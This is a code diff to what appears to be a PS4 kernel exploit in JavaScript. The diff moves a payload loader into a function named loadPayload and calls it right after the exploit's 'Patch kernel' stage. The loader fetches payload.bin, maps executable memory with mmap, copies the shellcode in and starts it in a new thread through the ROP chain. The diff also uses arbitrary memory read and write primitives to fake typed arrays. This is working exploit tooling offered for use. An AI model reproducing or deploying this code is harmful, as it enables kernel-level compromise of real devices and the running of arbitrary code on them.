@@ -62,6 +62,59 @@ const [is_ps4, version] = (() => {
     return [is_ps4, version];
 })();
 
+var nogc = [];
+function malloc(sz) {
+    var backing = new Uint8Array(0x10000 + sz);
+    nogc.push(backing);
+    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = backing;
+    return ptr;
+}
+
+function malloc32(sz) {
+    var backing = new Uint8Array(0x10000 + sz * 4);
+    nogc.push(backing);
+    var ptr = mem.readp(mem.addrof(backing).add(0x10));
+    ptr.backing = new Uint32Array(backing.buffer);
+    return ptr;
+}
+function array_from_address(addr, size) {
+   var og_array = new Uint32Array(0x1000);
+    var og_array_i = mem.addrof(og_array).add(0x10);
+    mem.write64(og_array_i, addr);
+    mem.write32(og_array_i.add(0x8), size);
+    mem.write32(og_array_i.add(0xC), 0x1);
+    nogc.push(og_array);
+    return og_array;
+}
+
+function loadPayload(){
+    var req = new XMLHttpRequest();
+    req.responseType = "arraybuffer";
+    req.open('GET','./payloads/payload.bin');
+    req.send();
+    req.onreadystatechange = function () {
+     if (req.readyState == 4) {
+      var PLD = req.response;
+      var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength*4, 7, 0x1002, -1, 0);
+      var pl = array_from_address(payload_buffer, PLD.byteLength*4);
+      var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+      var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+      tmp.set(new Uint8Array(req.response), 0);
+      tmp.set(padding, req.response.byteLength);
+      var shellcode = new Uint32Array(tmp.buffer);
+      pl.set(shellcode,0);
+      var pthread = malloc(0x10);
+      call_nze('pthread_create', pthread, 0, payload_buffer, 0);
+      allset();
+      }
+   };
+}
+
+function Exploit_done(){
+    loadPayload();
+}
+
 // sys/socket.h
 const AF_UNIX = 1;
 const AF_INET = 2;
@@ -144,7 +197,6 @@ const PROT_WRITE = 2;
 const PROT_EXEC = 4;
 
 let chain = null;
-var nogc = [];
 
 async function init() {
     await rop.init();
@@ -1772,6 +1824,7 @@ export async function kexploit() {
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
         
+        Exploit_done();  
     } finally {
         close(unblock_fd);
 
@@ -1792,53 +1845,3 @@ export async function kexploit() {
         close(sd);
     }
 }
-
-function malloc(sz) {
-    var backing = new Uint8Array(0x10000 + sz);
-    nogc.push(backing);
-    var ptr = mem.readp(mem.addrof(backing).add(0x10));
-    ptr.backing = backing;
-    return ptr;
-}
-
-function malloc32(sz) {
-    var backing = new Uint8Array(0x10000 + sz * 4);
-    nogc.push(backing);
-    var ptr = mem.readp(mem.addrof(backing).add(0x10));
-    ptr.backing = new Uint32Array(backing.buffer);
-    return ptr;
-}
-function array_from_address(addr, size) {
-   var og_array = new Uint32Array(0x1000);
-    var og_array_i = mem.addrof(og_array).add(0x10);
-    mem.write64(og_array_i, addr);
-    mem.write32(og_array_i.add(0x8), size);
-    mem.write32(og_array_i.add(0xC), 0x1);
-    nogc.push(og_array);
-    return og_array;
-}
-
-kexploit().then(() => {
-
-    var req = new XMLHttpRequest();
-    req.responseType = "arraybuffer";
-    req.open('GET','./payloads/payload.bin');
-    req.send();
-    req.onreadystatechange = function () {
-     if (req.readyState == 4) {
-      var PLD = req.response;
-      var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength*4, 7, 0x1002, -1, 0);
-      var pl = array_from_address(payload_buffer, PLD.byteLength*4);
-      var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
-      var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
-      tmp.set(new Uint8Array(req.response), 0);
-      tmp.set(padding, req.response.byteLength);
-      var shellcode = new Uint32Array(tmp.buffer);
-      pl.set(shellcode,0);
-      var pthread = malloc(0x10);
-      call_nze('pthread_create', pthread, 0, payload_buffer, 0);
-      allset();
-      }
-   };
-
-})
